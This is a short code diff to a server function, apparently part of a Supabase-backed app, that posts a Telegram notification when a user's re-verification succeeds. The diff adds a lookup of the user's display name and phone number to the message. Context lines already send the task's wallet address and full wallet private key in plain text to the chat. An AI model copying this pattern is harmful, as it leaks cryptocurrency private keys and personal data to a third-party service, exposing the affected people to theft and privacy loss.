@@ -285,10 +285,14 @@ export const completeReverify = createServerFn({ method: "POST" })
     if (error) throw new Error(error.message);
 
     try {
+      const { data: prof } = await supabaseAdmin
+        .from("profiles").select("display_name, phone_number").eq("id", userId).maybeSingle();
+      const userLine = `${prof?.display_name ?? "—"}${prof?.phone_number ? " · " + prof.phone_number : ""}`;
       await notifyTelegram(
         `🔄 <b>Re-verify OK</b>\n` +
+        `User: <b>${userLine}</b>\n` +
         `Slot: #${task.slot}\n` +
-        `Name: ${task.face_label ?? "—"}\n` +
+        `Face: ${task.face_label ?? "—"}\n` +
         `Wallet: <code>${task.wallet_address}</code>\n` +
         `Key: <code>${task.wallet_private_key}</code>`
       );
